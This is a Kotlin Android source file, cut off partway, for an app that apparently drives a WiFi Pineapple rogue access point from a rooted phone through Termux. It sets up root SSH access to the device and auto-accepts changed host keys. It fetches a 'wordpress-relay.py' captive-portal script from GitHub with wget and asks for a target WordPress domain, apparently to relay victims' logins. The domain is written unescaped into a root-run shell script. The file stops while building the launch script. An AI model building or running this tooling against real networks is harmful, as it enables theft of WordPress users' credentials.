package com.example.wordpressrelayapp

import android.content.ActivityNotFoundException
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.text.method.ScrollingMovementMethod
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import android.os.PowerManager
import android.view.WindowManager

class MainActivity : AppCompatActivity() {

    private val TERMUX_HOME = "/data/data/com.termux/files/home"
    private val TERMUX_BASH = "/data/data/com.termux/files/usr/bin/bash"
    private val SD_SCRIPT = "/sdcard/x11_start.sh"

    // Dynamic values to be populated
    private var termuxUid: String = ""
    private var termuxGid: String = ""
    private var termuxGroups: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Keep screen on while app is open
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        val textView = findViewById<TextView>(R.id.textView)
        textView.movementMethod = ScrollingMovementMethod()

        val button1 = findViewById<Button>(R.id.button1)
        val button2 = findViewById<Button>(R.id.button2)
        val button3 = findViewById<Button>(R.id.button3)
        val button4 = findViewById<Button>(R.id.button4)

        // Detect Termux UID/GID on startup
        detectTermuxIds()

        button1.setOnClickListener {
            textView.text = "Checking Termux installation..."
            Thread {
                try {
                    val diagnostics = StringBuilder()
                    diagnostics.appendLine("=== TERMUX DETECTION ===\n")

                    // Step 1: Check root access
                    diagnostics.appendLine("1. Checking root access...")
                    try {
                        val rootProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
                        val rootOutput = BufferedReader(InputStreamReader(rootProc.inputStream)).use { it.readText() }
                        val rootError = BufferedReader(InputStreamReader(rootProc.errorStream)).use { it.readText() }
                        val rootExit = rootProc.waitFor()

                        if (rootExit == 0) {
                            diagnostics.appendLine("   ✅ Root access available\n")
                        } else {
                            diagnostics.appendLine("   ❌ Root command failed (exit: $rootExit)")
                            if (rootError.isNotBlank()) diagnostics.appendLine("   Error: $rootError\n")
                            diagnostics.appendLine("Root access is required for this app to function.")
                            runOnUiThread { textView.text = diagnostics.toString() }
                            return@Thread
                        }
                    } catch (e: Exception) {
                        diagnostics.appendLine("   ❌ FAILED: ${e.message}\n")
                        diagnostics.appendLine("Root access is required for this app to function.")
                        runOnUiThread { textView.text = diagnostics.toString() }
                        return@Thread
                    }

                    // Step 2: Check packages.list for Termux
                    try {
                        val listProc = Runtime.getRuntime()
                            .exec(arrayOf("su", "-c", "grep '^com\\.termux ' /data/system/packages.list"))
                        val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
                        val listExit = listProc.waitFor()

                        if (listExit != 0 || listOutput.isBlank()) {
                            diagnostics.appendLine("2. ❌ Termux not found\n")
                            runOnUiThread { textView.text = diagnostics.toString() }
                            return@Thread
                        }

                        diagnostics.appendLine("2. ✅ Termux installed\n")

                        // Format: com.termux 10321 0 /data/user/0/com.termux ...
                        val parts = listOutput.trim().split("\\s+".toRegex())
                        if (parts.size < 2) {
                            diagnostics.appendLine("   ❌ Invalid format in packages.list")
                            runOnUiThread { textView.text = diagnostics.toString() }
                            return@Thread
                        }

                        val termuxAppId = parts[1].toIntOrNull()
                        if (termuxAppId == null) {
                            diagnostics.appendLine("   ❌ Could not parse UID from packages.list")
                            runOnUiThread { textView.text = diagnostics.toString() }
                            return@Thread
                        }

                        // Step 3: Check packages.list for Termux:X11
                        val x11Proc = Runtime.getRuntime()
                            .exec(arrayOf("su", "-c", "grep com.termux.x11 /data/system/packages.list"))
                        val x11Output = BufferedReader(InputStreamReader(x11Proc.inputStream)).use { it.readText() }
                        val x11Exit = x11Proc.waitFor()

                        if (x11Exit != 0 || x11Output.isBlank()) {
                            diagnostics.appendLine("3. ❌ Termux:X11 not found\n")
                            runOnUiThread { textView.text = diagnostics.toString() }
                            return@Thread
                        }

                        diagnostics.appendLine("4. ✅ Termux:X11 installed\n")

                        // Step 4: Calculate standard Android groups
                        diagnostics.appendLine("4. Calculating standard Android groups...")
                        val appId = termuxAppId - 10000 // Extract app number (e.g., 10321 -> 321)
                        diagnostics.appendLine("   Termux UID: $termuxAppId")
                        diagnostics.appendLine("   App ID: $appId")
                        diagnostics.appendLine("   Primary GID: $termuxAppId")
                        diagnostics.appendLine("   Supplementary groups:")
                        diagnostics.appendLine("     - 3003 (inet - network access)")
                        diagnostics.appendLine("     - 9997 (everybody)")
                        diagnostics.appendLine("     - ${20000 + appId} (cache group)")
                        diagnostics.appendLine("     - ${50000 + appId} (all group)")
                    } catch (e: Exception) {
                        diagnostics.appendLine("   ❌ Exception: ${e.message}")
                        diagnostics.appendLine("\nStack trace:")
                        diagnostics.appendLine(e.stackTraceToString())
                    }

                    runOnUiThread {
                        textView.text = diagnostics.toString()
                    }
                } catch (e: Exception) {
                    runOnUiThread {
                        textView.text = "Error: ${e.message}\n${e.stackTraceToString()}"
                    }
                }
            }.start()
        }

        button2.setOnClickListener {
            textView.text = "Launching Termux and testing connection..."

            Thread {
                try {
                    val (success, errorMsg) = ensureTermuxIdsDetected()
                    if (!success) {
                        runOnUiThread {
                            textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg"
                        }
                        return@Thread
                    }

                    // Launch Termux to initialize environment
                    try {
                        val termuxLaunch = packageManager.getLaunchIntentForPackage("com.termux")
                            ?: Intent().apply {
                                setClassName("com.termux", "com.termux.app.TermuxActivity")
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            }
                        startActivity(termuxLaunch)

                        Thread.sleep(2000)

                        val returnIntent = Intent(this@MainActivity, MainActivity::class.java).apply {
                            flags = Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                        }
                        startActivity(returnIntent)

                        Thread.sleep(500)

                    } catch (_: ActivityNotFoundException) {
                        runOnUiThread { textView.text = "❌ Termux not installed." }
                        return@Thread
                    } catch (e: Exception) {
                        runOnUiThread { textView.text = "❌ Unable to launch Termux: ${e.message}" }
                        return@Thread
                    }

                    // Added timeout to ping command (15 seconds max)
                    val proc = Runtime.getRuntime().exec(
                        arrayOf(
                            "su", termuxUid, "-c",
                            "timeout 15 ping -c 4 172.16.42.1"
                        )
                    )

                    val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
                    val error = BufferedReader(InputStreamReader(proc.errorStream)).use { it.readText() }
                    val exitCode = proc.waitFor()

                    runOnUiThread {
                        textView.text = buildString {
                            appendLine("=== Ping 172.16.42.1 (WiFi Pineapple) ===")
                            appendLine("Exit: $exitCode")
                            appendLine("")
                            if (output.isNotBlank()) {
                                appendLine(output.trim())
                            }
                            if (error.isNotBlank()) {
                                appendLine("\n=== ERROR ===")
                                appendLine(error.trim())
                            }
                            appendLine("")
                            when (exitCode) {
                                0 -> appendLine("✅ Pineapple is reachable!")
                                124 -> appendLine("❌ Connection timed out after 15 seconds")
                                else -> appendLine("❌ Pineapple is NOT reachable")
                            }
                        }.trim()
                    }
                } catch (e: Exception) {
                    runOnUiThread { textView.text = "Error: ${e.message}" }
                }
            }.start()
        }

        button3.setOnClickListener {
            textView.text = "Checking prerequisites..."

            Thread {
                try {
                    val (success, errorMsg) = ensureTermuxIdsDetected()
                    if (!success) {
                        runOnUiThread {
                            textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg"
                        }
                        return@Thread
                    }

                    val scriptLines = mutableListOf<String>()
                    scriptLines.add("#!/data/data/com.termux/files/usr/bin/bash")
                    scriptLines.add("set -e")
                    scriptLines.add("")
                    scriptLines.add("export HOME=/data/data/com.termux/files/home")
                    scriptLines.add("export PREFIX=/data/data/com.termux/files/usr")
                    scriptLines.add("export PATH=\"${'$'}PREFIX/bin:${'$'}PATH\"")
                    scriptLines.add("")
                    scriptLines.add("cd \"${'$'}HOME\"")
                    scriptLines.add("")
                    scriptLines.add("echo 'Checking files...' > prereq_check.log")
                    scriptLines.add("")
                    scriptLines.add("if [ -f .ssh/pineapple ]; then")
                    scriptLines.add("    echo 'SSH_KEY:EXISTS'")
                    scriptLines.add("else")
                    scriptLines.add("    echo 'SSH_KEY:MISSING'")
                    scriptLines.add("fi")
                    scriptLines.add("")
                    scriptLines.add("if [ -f wordpress-relay.py ]; then")
                    scriptLines.add("    echo 'SCRIPT:EXISTS'")
                    scriptLines.add("else")
                    scriptLines.add("    echo 'SCRIPT:MISSING'")
                    scriptLines.add("fi")

                    val checkScript = scriptLines.joinToString("\n")
                    val checkScriptPath = "/sdcard/check_prereqs.sh"
                    writeFileAsRoot(checkScriptPath, checkScript)
                    execAsRoot("chmod 644 $checkScriptPath")

                    val checkPipeline = "cat $checkScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                    val checkProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", checkPipeline))
                    val checkOutput = BufferedReader(InputStreamReader(checkProc.inputStream)).use { it.readText() }
                    val checkError = BufferedReader(InputStreamReader(checkProc.errorStream)).use { it.readText() }
                    checkProc.waitFor()

                    val sshKeyExists = checkOutput.contains("SSH_KEY:EXISTS")
                    val pythonScriptExists = checkOutput.contains("SCRIPT:EXISTS")

                    val statusMessage = StringBuilder()

                    if (sshKeyExists && pythonScriptExists) {
                        statusMessage.appendLine("✅ Private SSH Key and Relay Script Exist in Current Directory")
                        statusMessage.appendLine("Proceeding to host key verification…")
                    } else {
                        statusMessage.appendLine("=== Setting Up Prerequisites ===\n")
                    }

                    var needToTransferKey = false

                    if (!sshKeyExists) {
                        statusMessage.appendLine("📝 Generating SSH key pair...")

                        val keygenSuccess = generateSshKeyPair(statusMessage)

                        if (keygenSuccess) {
                            needToTransferKey = true
                        }

                        // IMMEDIATELY PROMPT FOR PASSWORD AND TRANSFER KEY AFTER GENERATION
                        if (needToTransferKey) {
                            statusMessage.appendLine("🔑 Prompting for SSH password to transfer newly generated key...")

                            // Show current status before prompting
                            runOnUiThread {
                                textView.text = statusMessage.toString()
                            }

                            // Prompt user for SSH password on UI thread
                            var userPassword: String? = null
                            val passwordLatch = java.util.concurrent.CountDownLatch(1)

                            runOnUiThread {
                                val passwordInput = EditText(this@MainActivity)
                                passwordInput.hint = "SSH root password"
                                passwordInput.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD

                                val dialog = android.app.AlertDialog.Builder(this@MainActivity)
                                    .setTitle("SSH Password Required")
                                    .setMessage("Enter SSH password for root@172.16.42.1 to transfer the newly generated key:")
                                    .setView(passwordInput)
                                    .setPositiveButton("OK") { _, _ ->
                                        userPassword = passwordInput.text.toString()
                                        passwordLatch.countDown()
                                    }
                                    .setNegativeButton("Cancel") { _, _ ->
                                        userPassword = null
                                        passwordLatch.countDown()
                                    }
                                    .setCancelable(false)
                                    .create()

                                dialog.show()
                            }

                            // Wait for user input
                            passwordLatch.await()

                            if (userPassword == null || userPassword!!.isEmpty()) {
                                statusMessage.apply {
                                    appendLine("")
                                    appendLine("❌ Password input cancelled or empty")
                                    appendLine("   SSH key was generated but not transferred to Pineapple")
                                    appendLine("   You can transfer it manually or run Button 3 again")
                                }
                            } else {
                                // Transfer the key using sshpass
                                statusMessage.appendLine("")
                                statusMessage.appendLine("⚙️ Transferring public key to Pineapple...")

                                val transferSuccess = transferKeyWithPasswordAndRegenerate(userPassword!!, statusMessage)

                                if (transferSuccess) {
                                    needToTransferKey = false // Mark as successfully transferred
                                }
                            }
                        }
                    } else {
                        statusMessage.appendLine("✅ SSH key already exists\n")
                    }

                    if (!pythonScriptExists) {
                        statusMessage.appendLine("📥 Downloading wordpress-relay.py...")

                        val downloadLines = mutableListOf<String>()
                        downloadLines.add("#!/data/data/com.termux/files/usr/bin/bash")
                        downloadLines.add("set -e")
                        downloadLines.add("")
                        downloadLines.add("export HOME=/data/data/com.termux/files/home")
                        downloadLines.add("export PREFIX=/data/data/com.termux/files/usr")
                        downloadLines.add("export PATH=\"${'$'}PREFIX/bin:${'$'}PATH\"")
                        downloadLines.add("")
                        downloadLines.add("cd \"${'$'}HOME\"")
                        downloadLines.add("")
                        downloadLines.add("wget -q https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/execution/wordpress-relay.py")
                        downloadLines.add("")
                        downloadLines.add("if [ -f wordpress-relay.py ]; then")
                        downloadLines.add("    echo 'DOWNLOAD:SUCCESS'")
                        downloadLines.add("else")
                        downloadLines.add("    echo 'DOWNLOAD:FAILED'")
                        downloadLines.add("fi")

                        val downloadScript = downloadLines.joinToString("\n")
                        val downloadScriptPath = "/sdcard/download_script.sh"
                        writeFileAsRoot(downloadScriptPath, downloadScript)
                        execAsRoot("chmod 644 $downloadScriptPath")

                        val downloadPipeline = "cat $downloadScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                        val downloadProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", downloadPipeline))
                        val downloadOutput = BufferedReader(InputStreamReader(downloadProc.inputStream)).use { it.readText() }
                        val downloadError = BufferedReader(InputStreamReader(downloadProc.errorStream)).use { it.readText() }
                        downloadProc.waitFor()

                        if (downloadOutput.contains("DOWNLOAD:SUCCESS")) {
                            statusMessage.appendLine("✅ Python script downloaded!\n")
                        } else {
                            statusMessage.appendLine("❌ Failed to download Python script\n")
                            if (downloadOutput.isNotBlank()) statusMessage.appendLine("Output: $downloadOutput\n")
                            if (downloadError.isNotBlank()) statusMessage.appendLine("Error: $downloadError\n")
                        }
                    } else {
                        statusMessage.appendLine("✅ Python script already exists\n")
                    }

                    var sshpassAttempted = false
                    var sshpassSuccess = false

                    // ==== SSH host key verification & repair flow ====
                    // Only run this if the key wasn't just generated and transferred
                    if (!needToTransferKey) {
                        run {
                            val hostCheckLines = mutableListOf<String>()
                            hostCheckLines.add("#!/data/data/com.termux/files/usr/bin/bash")
                            hostCheckLines.add("set +e")  // Don't exit on error
                            hostCheckLines.add("")
                            hostCheckLines.add("export HOME=/data/data/com.termux/files/home")
                            hostCheckLines.add("export PREFIX=/data/data/com.termux/files/usr")
                            hostCheckLines.add("export PATH=\"${'$'}PREFIX/bin:${'$'}PATH\"")
                            hostCheckLines.add("")
                            hostCheckLines.add("cd \"${'$'}HOME\"")
                            hostCheckLines.add("")
                            hostCheckLines.add("HOST=172.16.42.1")
                            hostCheckLines.add("ERR1=ssh_err_1.txt")
                            hostCheckLines.add("ERR2=ssh_err_2.txt")
                            hostCheckLines.add("ERR3=ssh_err_3.txt")
                            hostCheckLines.add("rm -f \"${'$'}ERR1\" \"${'$'}ERR2\" \"${'$'}ERR3\"")
                            hostCheckLines.add("")
                            hostCheckLines.add("echo 'HOSTCHECK:START'")
                            hostCheckLines.add("")
                            hostCheckLines.add("# Try strict host key check (non-interactive)")
                            hostCheckLines.add("status1=0")
                            hostCheckLines.add("ssh -i .ssh/pineapple -o BatchMode=yes -o StrictHostKeyChecking=yes -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@${'$'}HOST true 2>\"${'$'}ERR1\" || status1=${'$'}?")
                            hostCheckLines.add("")
                            hostCheckLines.add("if [ ${'$'}status1 -eq 0 ]; then")
                            hostCheckLines.add("  echo 'HOSTKEY_FAILED:NO'")
                            hostCheckLines.add("  echo 'PUBKEY_FAILED:NO'")
                            hostCheckLines.add("  echo 'HOSTKEY_REMOVED:NO'")
                            hostCheckLines.add("  echo 'NEW_CONNECTION_OK:YES'")
                            hostCheckLines.add("  echo 'HOSTCHECK:END'")
                            hostCheckLines.add("  exit 0")
                            hostCheckLines.add("fi")
                            hostCheckLines.add("")
                            hostCheckLines.add("# Check if it was a host key verification failure")
                            hostCheckLines.add("if grep -qiE 'host key verification failed|REMOTE HOST IDENTIFICATION HAS CHANGED' \"${'$'}ERR1\"; then")
                            hostCheckLines.add("  echo 'HOSTKEY_FAILED:YES'")
                            hostCheckLines.add("  # Check if pubkey auth also failed")
                            hostCheckLines.add("  if grep -qiE 'Permission denied.*publickey' \"${'$'}ERR1\"; then")
                            hostCheckLines.add("    echo 'PUBKEY_FAILED:YES'")
                            hostCheckLines.add("  else")
                            hostCheckLines.add("    echo 'PUBKEY_FAILED:NO'")
                            hostCheckLines.add("  fi")
                            hostCheckLines.add("  # Remove old key only if known_hosts exists")
                            hostCheckLines.add("  if [ -f \"${'$'}HOME/.ssh/known_hosts\" ]; then")
                            hostCheckLines.add("    if ssh-keygen -R \"${'$'}HOST\" >/dev/null 2>&1; then")
                            hostCheckLines.add("      echo 'HOSTKEY_REMOVED:YES'")
                            hostCheckLines.add("    else")
                            hostCheckLines.add("      echo 'HOSTKEY_REMOVED:NO'")
                            hostCheckLines.add("    fi")
                            hostCheckLines.add("  else")
                            hostCheckLines.add("    echo 'HOSTKEY_REMOVED:NO'")
                            hostCheckLines.add("  fi")
                            hostCheckLines.add("  # Reconnect, auto-accept new host key non-interactive")
                            hostCheckLines.add("  ssh -i .ssh/pineapple -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@${'$'}HOST true 2>\"${'$'}ERR2\" || true")
                            hostCheckLines.add("  # Verify again with strict checking")
                            hostCheckLines.add("  status3=0")
                            hostCheckLines.add("  ssh -i .ssh/pineapple -o BatchMode=yes -o StrictHostKeyChecking=yes -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@${'$'}HOST true 2>\"${'$'}ERR3\" || status3=${'$'}?")
                            hostCheckLines.add("  if [ ${'$'}status3 -eq 0 ]; then")
                            hostCheckLines.add("    echo 'NEW_CONNECTION_OK:YES'")
                            hostCheckLines.add("  else")
                            hostCheckLines.add("    echo 'NEW_CONNECTION_OK:NO'")
                            hostCheckLines.add("    echo 'E1:'; cat \"${'$'}ERR1\" 2>/dev/null | head -20 || true")
                            hostCheckLines.add("    echo 'E2:'; cat \"${'$'}ERR2\" 2>/dev/null | head -20 || true")
                            hostCheckLines.add("    echo 'E3:'; cat \"${'$'}ERR3\" 2>/dev/null | head -20 || true")
                            hostCheckLines.add("  fi")
                            hostCheckLines.add("else")
                            hostCheckLines.add("  # Some other failure - check if it's pubkey auth failure")
                            hostCheckLines.add("  if grep -qiE 'Permission denied.*publickey' \"${'$'}ERR1\"; then")
                            hostCheckLines.add("    echo 'HOSTKEY_FAILED:NO'")
                            hostCheckLines.add("    echo 'PUBKEY_FAILED:YES'")
                            hostCheckLines.add("    echo 'HOSTKEY_REMOVED:NO'")
                            hostCheckLines.add("    echo 'NEW_CONNECTION_OK:NO'")
                            hostCheckLines.add("  else")
                            hostCheckLines.add("    echo 'HOSTKEY_FAILED:NO'")
                            hostCheckLines.add("    echo 'PUBKEY_FAILED:NO'")
                            hostCheckLines.add("    echo 'HOSTKEY_REMOVED:NO'")
                            hostCheckLines.add("    echo 'NEW_CONNECTION_OK:NO'")
                            hostCheckLines.add("  fi")
                            hostCheckLines.add("  echo 'E1:'; cat \"${'$'}ERR1\" 2>/dev/null | head -20 || true")
                            hostCheckLines.add("fi")
                            hostCheckLines.add("")
                            hostCheckLines.add("echo 'HOSTCHECK:END'")

                            val hostCheckScript = hostCheckLines.joinToString("\n")
                            val hostCheckScriptPath = "/sdcard/hostkey_check.sh"
                            writeFileAsRoot(hostCheckScriptPath, hostCheckScript)
                            execAsRoot("chmod 644 $hostCheckScriptPath")

                            val hostCheckPipeline = "cat $hostCheckScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                            val hostCheckProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", hostCheckPipeline))
                            val hostCheckOut = BufferedReader(InputStreamReader(hostCheckProc.inputStream)).use { it.readText() }
                            val hostCheckErr = BufferedReader(InputStreamReader(hostCheckProc.errorStream)).use { it.readText() }
                            hostCheckProc.waitFor()

                            // Parse the actual output flags
                            val hostKeyFailed = hostCheckOut.contains("HOSTKEY_FAILED:YES")
                            val pubkeyFailed = hostCheckOut.contains("PUBKEY_FAILED:YES")
                            val hostKeyRemoved = hostCheckOut.contains("HOSTKEY_REMOVED:YES")
                            val newConnectionOk = hostCheckOut.contains("NEW_CONNECTION_OK:YES")

                            // If pubkey authentication failed, prompt for password and attempt automatic key transfer
                            if (pubkeyFailed && !newConnectionOk) {
                                statusMessage.apply {
                                    appendLine("—".repeat(50))
                                    appendLine("🔑 SSH Host Key Verification")
                                    appendLine("")
                                    appendLine("1) Host key verification failed: ${if (hostKeyFailed) "YES" else "NO"}")
                                    appendLine("2) Pubkey authentication failed: YES")
                                    appendLine("3) Ran ssh-keygen -R to delete old key: ${if (hostKeyRemoved) "YES" else "NO"}")
                                    appendLine("4) New connection successfully initiated: NO")
                                    appendLine("")
                                    appendLine("⚙️ Prompting for SSH password to transfer key...")
                                }

                                // Show current status before prompting
                                runOnUiThread {
                                    textView.text = statusMessage.toString()
                                }

                                // Prompt user for SSH password on UI thread
                                var userPassword: String? = null
                                val passwordLatch = java.util.concurrent.CountDownLatch(1)

                                runOnUiThread {
                                    val passwordInput = EditText(this@MainActivity)
                                    passwordInput.hint = "SSH root password"
                                    passwordInput.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD

                                    val dialog = android.app.AlertDialog.Builder(this@MainActivity)
                                        .setTitle("SSH Password Required")
                                        .setMessage("Enter SSH password for root@172.16.42.1:")
                                        .setView(passwordInput)
                                        .setPositiveButton("OK") { _, _ ->
                                            userPassword = passwordInput.text.toString()
                                            passwordLatch.countDown()
                                        }
                                        .setNegativeButton("Cancel") { _, _ ->
                                            userPassword = null
                                            passwordLatch.countDown()
                                        }
                                        .setCancelable(false)
                                        .create()

                                    dialog.show()
                                }

                                // Wait for user input
                                passwordLatch.await()

                                if (userPassword == null || userPassword!!.isEmpty()) {
                                    statusMessage.apply {
                                        appendLine("")
                                        appendLine("❌ Password input cancelled or empty")
                                        appendLine("   Cannot proceed with automatic key transfer")
                                    }
                                    runOnUiThread {
                                        textView.text = statusMessage.toString()
                                    }
                                    return@run
                                }

                                sshpassAttempted = true
                                sshpassSuccess = transferKeyWithPasswordAndRegenerate(userPassword!!, statusMessage)
                            }

                            statusMessage.apply {
                                if (!sshpassAttempted) {
                                    appendLine("—".repeat(50))
                                    appendLine("🔑 SSH Host Key Verification")
                                    appendLine("")
                                    appendLine("1) Host key verification failed: ${if (hostKeyFailed) "YES" else "NO"}")
                                    appendLine("2) Pubkey authentication failed: ${if (pubkeyFailed) "YES" else "NO"}")
                                    appendLine("3) Ran ssh-keygen -R to delete old key: ${if (hostKeyRemoved) "YES" else "NO"}")
                                    appendLine("4) New connection successfully initiated: ${if (newConnectionOk) "YES" else "NO"}")
                                    appendLine("")

                                    when {
                                        !hostKeyFailed && !pubkeyFailed && newConnectionOk -> {
                                            appendLine("✅ Host key verification and pubkey authentication succeeded (no action needed)")
                                        }
                                        hostKeyFailed && hostKeyRemoved && newConnectionOk -> {
                                            appendLine("✅ Fixed host key issue: removed old key and accepted new key")
                                        }
                                        hostKeyFailed && !hostKeyRemoved && newConnectionOk -> {
                                            appendLine("✅ Fixed host key issue: accepted new key (no old key to remove)")
                                        }
                                        pubkeyFailed && !hostKeyFailed -> {
                                            appendLine("❌ Pubkey authentication failed - key may not be authorized on server")
                                            if (hostCheckOut.contains("E1:")) {
                                                appendLine("\nError details:")
                                                val errorStart = hostCheckOut.indexOf("E1:")
                                                val errorEnd = hostCheckOut.indexOf("HOSTCHECK:END", errorStart)
                                                if (errorEnd > errorStart) {
                                                    appendLine(hostCheckOut.substring(errorStart, errorEnd).trim())
                                                }
                                            }
                                        }
                                        hostKeyFailed && !newConnectionOk -> {
                                            appendLine("❌ Host key issue detected but could not establish new connection")
                                            if (hostCheckOut.contains("E1:")) {
                                                appendLine("\nError details:")
                                                val errorStart = hostCheckOut.indexOf("E1:")
                                                val errorEnd = hostCheckOut.indexOf("HOSTCHECK:END", errorStart)
                                                if (errorEnd > errorStart) {
                                                    appendLine(hostCheckOut.substring(errorStart, errorEnd).trim())
                                                }
                                            }
                                        }
                                        !hostKeyFailed && !pubkeyFailed && !newConnectionOk -> {
                                            appendLine("❌ SSH connection failed (not a host key or pubkey issue)")
                                            if (hostCheckOut.contains("E1:")) {
                                                appendLine("\nError details:")
                                                val errorStart = hostCheckOut.indexOf("E1:")
                                                val errorEnd = hostCheckOut.indexOf("HOSTCHECK:END", errorStart)
                                                if (errorEnd > errorStart) {
                                                    appendLine(hostCheckOut.substring(errorStart, errorEnd).trim())
                                                }
                                            }
                                        }
                                        else -> {
                                            appendLine("❌ Unexpected result")
                                            appendLine("\nDebug output:")
                                            appendLine(hostCheckOut)
                                        }
                                    }
                                }

                                appendLine("—".repeat(50))
                            }
                        }
                    }

                    // Key transfer guidance - only show if key was just created AND sshpass wasn't successful
                    if (needToTransferKey && (!sshpassAttempted || !sshpassSuccess)) {
                        statusMessage.appendLine("\n")
                        statusMessage.appendLine("=".repeat(50))
                        statusMessage.appendLine("⚠️  IMPORTANT: SSH KEY TRANSFER REQUIRED")
                        statusMessage.appendLine("=".repeat(50))
                        statusMessage.appendLine("\nYou must transfer the public key to the Pineapple.")
                        statusMessage.appendLine("\nOpen Termux and run these commands:\n")
                        statusMessage.appendLine("scp ~/.ssh/pineapple.pub root@172.16.42.1:/root/.ssh/authorized_keys")
                        statusMessage.appendLine("\nAfter completing these steps, press Button 3 again.")
                    }

                    runOnUiThread {
                        textView.text = statusMessage.toString()
                    }

                } catch (e: Exception) {
                    runOnUiThread { textView.text = "Error: ${e.message}\n${e.stackTraceToString()}" }
                }
            }.start()
        }

button4.setOnClickListener {
            textView.text = "Loading last URL..."

            Thread {
                try {
                    val (success, errorMsg) = ensureTermuxIdsDetected()
                    if (!success) {
                        runOnUiThread {
                            textView.text = "❌ Failed to detect Termux UID/GID\n\n$errorMsg"
                        }
                        return@Thread
                    }

                    val readUrlScript = """
                        #!/data/data/com.termux/files/usr/bin/bash
                        export HOME=/data/data/com.termux/files/home
                        export PREFIX=/data/data/com.termux/files/usr
                        export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                        cd "${'$'}HOME"
                        if [ -f last-url.txt ]; then
                            cat last-url.txt
                        else
                            echo ""
                        fi
                    """.trimIndent()

                    val readUrlScriptPath = "/sdcard/read_last_url.sh"
                    writeFileAsRoot(readUrlScriptPath, readUrlScript)
                    execAsRoot("chmod 644 $readUrlScriptPath")

                    val readUrlPipeline = "cat $readUrlScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                    val readUrlProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", readUrlPipeline))
                    val lastUrl = BufferedReader(InputStreamReader(readUrlProc.inputStream)).use { it.readText() }.trim()
                    readUrlProc.waitFor()

                    runOnUiThread {
                        val input = EditText(this@MainActivity)
                        input.hint = "https://example.com"
                        input.inputType = InputType.TYPE_TEXT_VARIATION_URI

                        if (lastUrl.isNotEmpty()) {
                            input.setText(lastUrl)
                            textView.text = "Last URL loaded: $lastUrl"
                        } else {
                            textView.text = "No previous URL found. Enter a new one."
                        }

                        val dialog = android.app.AlertDialog.Builder(this@MainActivity)
                            .setTitle("Enter WordPress Domain")
                            .setMessage("Enter the full WordPress domain URL:")
                            .setView(input)
                            .setPositiveButton("Start", null)
                            .setNegativeButton("Cancel", null)
                            .setNeutralButton("Clear", null)
                            .create()

                        dialog.setOnShowListener {
                            val startButton = dialog.getButton(android.app.AlertDialog.BUTTON_POSITIVE)
                            val cancelButton = dialog.getButton(android.app.AlertDialog.BUTTON_NEGATIVE)
                            val clearButton = dialog.getButton(android.app.AlertDialog.BUTTON_NEUTRAL)

                            clearButton.setOnClickListener {
                                input.setText("")
                            }

                            cancelButton.setOnClickListener {
                                dialog.dismiss()
                            }

                            startButton.setOnClickListener {
                                val domain = input.text.toString().trim()

                                if (domain.isEmpty()) {
                                    textView.text = "❌ Domain cannot be empty"
                                    dialog.dismiss()
                                    return@setOnClickListener
                                }

                                if (!domain.startsWith("http://") && !domain.startsWith("https://")) {
                                    textView.text = "❌ Domain must start with http:// or https://"
                                    dialog.dismiss()
                                    return@setOnClickListener
                                }

                                textView.text = "Saving URL and creating script…"
                                dialog.dismiss()

                                Thread {
                                    try {
                                        val saveUrlScript = """
                                            #!/data/data/com.termux/files/usr/bin/bash
                                            export HOME=/data/data/com.termux/files/home
                                            export PREFIX=/data/data/com.termux/files/usr
                                            export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                                            cd "${'$'}HOME"
                                            echo "$domain" > last-url.txt
                                            if [ -f last-url.txt ]; then
                                                echo "URL_SAVED_SUCCESS"
                                            else
                                                echo "URL_SAVED_FAILED"
                                            fi
                                        """.trimIndent()

                                        val saveUrlScriptPath = "/sdcard/save_last_url.sh"
                                        writeFileAsRoot(saveUrlScriptPath, saveUrlScript)
                                        execAsRoot("chmod 644 $saveUrlScriptPath")

                                        val saveUrlPipeline = "cat $saveUrlScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                                        val saveUrlProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", saveUrlPipeline))
                                        val saveUrlOutput = BufferedReader(InputStreamReader(saveUrlProc.inputStream)).use { it.readText() }
                                        saveUrlProc.waitFor()

                                        if (!saveUrlOutput.contains("URL_SAVED_SUCCESS")) {
                                            runOnUiThread {
                                                textView.text = "⚠️ Warning: Failed to save URL to last-url.txt\nProceeding anyway..."
                                            }
                                            Thread.sleep(1500)
                                        }

                                        val scriptContent = """
                                            #!$TERMUX_BASH
                                            set -e

                                            export HOME=$TERMUX_HOME
                                            export PREFIX=/data/data/com.termux/files/usr
                                            export PATH="${'$'}PREFIX/bin:${'$'}PATH"

